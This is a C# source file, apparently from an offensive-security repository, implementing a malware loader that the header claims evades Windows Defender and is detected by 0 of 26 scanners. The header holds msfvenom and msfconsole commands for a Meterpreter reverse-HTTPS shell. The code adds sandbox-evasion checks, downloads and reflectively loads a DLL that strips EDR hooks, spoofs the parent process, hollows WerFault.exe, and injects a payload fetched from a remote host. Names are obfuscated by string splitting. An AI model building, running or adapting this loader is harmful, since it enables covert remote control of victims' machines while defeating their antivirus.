/*
    practical/C.Code/merklib/merklib_test3

    Process Hollowing + PPID spoofing + API Unhooking + Reflective Load DLLs + cryptor/merklib + Sleep (HEUR) + PssWalkMarkerCreate (HEUR)

    BEATS Windows 10 Defender w/Runtime Protection enabled
    https://roberreigada.github.io/posts/playing_with_an_edr/
    https://gist.github.com/rasta-mouse/af009f49229c856dc26e3a243db185ec
    https://github.innominds.com/GetRektBoy724/SharpUnhooker
    
    Uses merklib.dll
    practical/C.Code/Merklib/merklib

    Uses SharpUnhook.dll
    practical/C.Code/Merklib/SharpUnhook

    // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.187 LPORT=443 EXITFUNC=thread EnableStageEncoding=True -f raw -o ~/ETBD/crypted/met64raw_dot187.txt
    // sudo msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.56.187; set LPORT 443; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; run"    
    // ~/ETBD/tools/cryptor.py -i ~/ETBD/crypted/met64raw_dot187.txt -m c,b,x,b,r,c,r,b,b,r
    // [x] http://192.168.56.187/fun/1afvUxKznFdL.raw

    Takes three args:
    1. Merklib encrypted payload URL
    2. Spoof parent process (PID or name, will select first PID found if by name)
    3. Child process to spawn under spoofed parent and hollow, full path

    .\merklib_test3.exe http://192.168.56.187/fun/1afvUxKznFdL.raw explorer c:\\Windows\\System32\\WerFault.exe

    merklib_test.exe - detected by 0/26 antiscan.me
    merklib.dll - also detected by 0/26 antiscan.me

    
*/


using System;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Reflection;


namespace MerklibTestPH
{
    public class Program
    {

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 PssWalkMarkerCreate(
            IntPtr Allocator,
            ref IntPtr WalkMarkerHandle
        );


        [DllImport("kernel32.dll")]
        static extern void Sleep(
            uint dwMilliseconds
        );


        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        internal struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniquePID;
            public IntPtr InheritedFromUniqueProcessId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [Flags]
        public enum ProcThreadAttribute : int
        {
            MITIGATION_POLICY = 0x20007,
            PARENT_PROCESS = 0x00020000
        }

        [Flags]
        public enum BinarySignaturePolicy : ulong
        {
            BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000,
            BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE = 0x300000000000
        }

        [Flags]
        public enum CreationFlags : uint
        {
            CreateSuspended = 0x00000004,
            DetachedProcess = 0x00000008,
            CreateNoWindow = 0x08000000,
            ExtendedStartupInfoPresent = 0x00080000
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        internal static extern bool CreateProcess(
            string lpApplicationName, 
            string lpCommandLine, 
            ref SECURITY_ATTRIBUTES lpProcessAttributes, 
            ref SECURITY_ATTRIBUTES lpThreadAttributes, 
            bool bInheritHandles, 
            uint dwCreationFlags, 
            IntPtr lpEnvironment, 
            string lpCurrentDirectory, 
            [In] ref STARTUPINFOEX lpStartupInfo, 
            out PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList, 
            int dwAttributeCount, 
            int dwFlags, 
            ref IntPtr lpSize
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList, 
            uint dwFlags, 
            IntPtr Attribute, 
            IntPtr lpValue, 
            IntPtr cbSize, 
            IntPtr lpPreviousValue, 
            IntPtr lpReturnSize
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool DeleteProcThreadAttributeList(
            IntPtr lpAttributeList
        );

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        internal static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead
        );

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
                IntPtr hProcess,
                IntPtr lpBaseAddress,
                byte[] lpBuffer,
                Int32 nSize,
                out IntPtr lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(
            IntPtr hThread
        );


        public static void Main(string[] args)
        {

            // try the sleep() method of heuristics bypass
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                // if delta not at least 1.5 seconds, that's a good sign emulation skipped Sleep.
                Environment.Exit(1);
            }

            // try PssWalkMarkerCreate method of bypass (does it work?)
            IntPtr wmcAlloc = new IntPtr();
            IntPtr wmcHandle = new IntPtr();
            Int32 result = PssWalkMarkerCreate(
               /* IntPtr Allocator,*/ wmcAlloc,
                /*ref IntPtr WalkMarkerHandle*/     ref wmcHandle
            );
            // assuming not emulated, we should get non-zero.
            if ((int)wmcAlloc != 0)
            {
                Environment.Exit(1);
            }


            string url = args[0];
            Uri uri = new Uri(url);
            string dll = uri.GetLeftPart(UriPartial.Authority) + "/m"+"er"+ "kli" + "b.d" + "ll";   // merklib
            string suDll = uri.GetLeftPart(UriPartial.Authority) + "/S" + "har" + "pUnh" + "o" + "ok" + ".d" + "ll"; // SharpUnhook
            string newParentProcName = args[1];
            string newChildProcPath = args[2];

            WebClient wc = new WebClient();

            // download the API unhooking DLL, reflectively load it, and unhook yer mom.
            byte[] suDllDat = wc.DownloadData(suDll);
            Assembly suAssem = Assembly.Load(suDllDat);

            // SharpUnhooker.SilentUnhooker
            // SharpUnhooker.EATCleansing
            var SU = suAssem.GetType("Sh" + "arp" + "Un" + "ho" + "ok" + "er");
            var SUO = Activator.CreateInstance(SU, null);
            var siUn = SU.GetMethod("Sil" + "en" + "t" + "Un" + "ho" + "oke" + "r", new Type[] { typeof(string) });
            var EATC = SU.GetMethod("EA" + "T" + "Cl" + "ean" + "sing", new Type[] { typeof(string) });
            object[] scold = new object[1];
            string[] HelicopterParents = {
                "ntd" + "ll.d" +"ll",
                "ke" +"rn" +"el" +"32." + "d" + "ll",
                "ker" +"ne" +"lba"+"se." + "d"+"ll",
                "a" + "d" + "vap" + "i3" + "2.d" + "l" + "l",
            };
            for (int i = 0; i < HelicopterParents.Length; i++)
            {
                scold[0] = HelicopterParents[i];
                siUn.Invoke(SUO, scold);
                EATC.Invoke(SUO, scold);
            }

            


            // Process Hollowing and ppid spoofing follows
            STARTUPINFOEX si = new STARTUPINFOEX();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            si.StartupInfo.cb = (Int32)Marshal.SizeOf(si);
            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
            pSec.nLength = Marshal.SizeOf(pSec);
            tSec.nLength = Marshal.SizeOf(tSec);

            IntPtr attribVal = Marshal.AllocHGlobal(IntPtr.Size);
            IntPtr attribSz = IntPtr.Zero;
            IntPtr nRead = IntPtr.Zero;

            byte[] addrBuf = new byte[IntPtr.Size];
            byte[] data = new byte[0x200];


            try
            {
                // get the attribSz of the InitializeProcThreadAttributeList struct
                InitializeProcThreadAttributeList(
                    /*IntPtr lpAttributeList*/      IntPtr.Zero,
                    /*int dwAttributeCount*/        2,
                    /*int dwFlags*/                 0,
                    /*ref IntPtr lpSize*/           ref attribSz
                );

                // need to allocate enough space for the attribute struct
                si.lpAttributeList = Marshal.AllocHGlobal(attribSz);

                // Now we'll initialize one for real
                InitializeProcThreadAttributeList(
                    /*IntPtr lpAttributeList*/      si.lpAttributeList,
                    /*int dwAttributeCount*/        2,
                    /*int dwFlags*/                 0,
                    /*ref IntPtr lpSize*/           ref attribSz
                );

                // need to set the BinarySignaturePolicy
                Marshal.WriteIntPtr(
                    attribVal,
                    new IntPtr((long)BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE)
                );

                // PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE (0x00000003ui64 << 44) 
                UpdateProcThreadAttribute(
                    /*IntPtr lpAttributeList*/      si.lpAttributeList,
                    /*uint dwFlags*/                0,
                    /*IntPtr Attribute*/            (IntPtr)ProcThreadAttribute.MITIGATION_POLICY,
                    /*IntPtr lpValue*/              attribVal,
                    /*IntPtr cbSize*/               attribSz,
                    /*IntPtr lpPreviousValue*/      IntPtr.Zero,
                    /*IntPtr lpReturnSize*/         IntPtr.Zero
                );

                // Get the ppid into attribVal so can update the ProcThreadAttribute PARENT_PROCESS
                IntPtr hNewParent = new IntPtr();
                // try first as newParentProcname points to a specific PID, else by first returned PID by process name
                Int32 parsedprocid = 0;
                if (Int32.TryParse(newParentProcName, out parsedprocid))
                {
                    hNewParent = Process.GetProcessById(parsedprocid).Handle;
                } else
                {
                    hNewParent = Process.GetProcessesByName(newParentProcName)[0].Handle;
                }
                attribVal = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(attribVal, hNewParent);

                // Spoof the parent process 
                UpdateProcThreadAttribute(
                    /*IntPtr lpAttributeList*/      si.lpAttributeList,
                    /*uint dwFlags*/                0,
                    /*IntPtr Attribute*/            (IntPtr)ProcThreadAttribute.PARENT_PROCESS,
                    /*IntPtr lpValue*/              attribVal,
                    /*IntPtr cbSize*/               attribSz,
                    /*IntPtr lpPreviousValue*/      IntPtr.Zero,
                    /*IntPtr lpReturnSize*/         IntPtr.Zero
                );

                // Now to concentrate on hollowing.

                CreateProcess(
                    /*string lpApplicationName*/                        null,
                    /*string lpCommandLine*/                            newChildProcPath,
                    /*ref IntPtr lpProcessAttributes*/                  ref pSec,
                    /*ref IntPtr lpThreadAttributes*/                   ref tSec,
                    /*bool bInheritHandles*/                            false,
                    /*uint dwCreationFlags*/                            (uint) (CreationFlags.CreateSuspended | CreationFlags.ExtendedStartupInfoPresent),
                    /*IntPtr lpEnvironment*/                            IntPtr.Zero,
                    /*string lpCurrentDirectory*/                       null,
                    /*[In] ref STARTUPINFOEX lpStartupInfo*/            ref si,
                    /*out PROCESS_INFORMATION lpProcessInformation*/    out pi
                );

                /*
                    Need to locate the EntryPoint of hollowProc.
                    First, call ZwQueryInformationProcess and fetch the address of the PEB from
                    the PROCESS_BASIC_INFORMATION structure
                */


                IntPtr hProcess = pi.hProcess;
                uint tmp = 0;
                ZwQueryInformationProcess(
                    /*IntPtr hProcess*/                                 hProcess,
                    /*int procInformationClass*/                        0,
                    /*ref PROCESS_BASIC_INFORMATION procInformation*/   ref bi,
                    /*uint ProcInfoLen*/                                (uint)(IntPtr.Size * 6),
                    /*ref uint retlen*/                                 ref tmp
                );


                // Get a pointer to image base of hollowProc
                IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);


                // get baseaddr of hollowProc
                ReadProcessMemory(
                    /*IntPtr hProcess*/                   hProcess,
                    /*IntPtr lpBaseAddress*/              ptrToImageBase,
                    /*[Out] byte[] lpBuffer*/             addrBuf,
                    /*int dwSize*/                        addrBuf.Length,
                    /*out IntPtr lpNumberOfBytesRead*/    out nRead
                );


                IntPtr hollowProcBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));


                // Get the PE Header (0x200 bytes)
                ReadProcessMemory(
                    /*IntPtr hProcess*/                   hProcess,
                    /*IntPtr lpBaseAddress*/              hollowProcBase,
                    /*[Out] byte[] lpBuffer*/             data,
                    /*int dwSize*/                        data.Length,
                    /*out IntPtr lpNumberOfBytesRead*/    out nRead
                );


                // parse the PE header to locate the EntryPoint
                // Need to read the content of PEB at offset 0x3c (e_lfanew)
                uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

                // e_lfanew + 0x28 == PE Header addr
                uint opthdr = e_lfanew_offset + 0x28;

                // four bytes at (e_lfanew_offset + 0x28)  == offset from image base to EntryPoint
                uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

                // Relative Virtual Address (rva) == hollowProc base addr + offset to EntryPoint
                // must add rva to the image base to obtain the full memory address of the EntryPoint
                IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)hollowProcBase);


                // download the merklib DLL, reflectively load it, decode the payload, WriteProcMemory
                byte[] dlldat = wc.DownloadData(dll);
                Assembly assem = Assembly.Load(dlldat);
                var m_deleg = assem.GetType("Me" + "rk" + "l" + "ib"); 
                var m_inst = Activator.CreateInstance(m_deleg, null); 
                var m_meth1 = m_deleg.GetMethod("Ge" + "t" + "R" + "ef2", new Type[] { typeof(string), typeof(IntPtr), typeof(IntPtr) });
                object[] merk = new object[3]; 
                merk[0] = url;
                merk[1] = hProcess;
                merk[2] = addressOfEntryPoint;          
                m_meth1.Invoke(m_inst, merk);

                // Finally, resume
                ResumeThread(
                    /*IntPtr hThread*/  pi.hThread
                );

            }
            catch (Exception e)
            {
                Console.WriteLine(e.StackTrace);
            }
            finally
            {
                DeleteProcThreadAttributeList(
                    /*IntPtr lpAttributeList*/  si.lpAttributeList
                ) ;
                Marshal.FreeHGlobal(si.lpAttributeList);
                Marshal.FreeHGlobal(attribVal);
            }
        }
    }
}
